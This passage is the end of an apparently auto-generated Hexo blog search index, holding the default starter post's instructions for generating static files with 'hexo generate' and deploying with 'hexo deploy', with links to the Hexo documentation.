title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
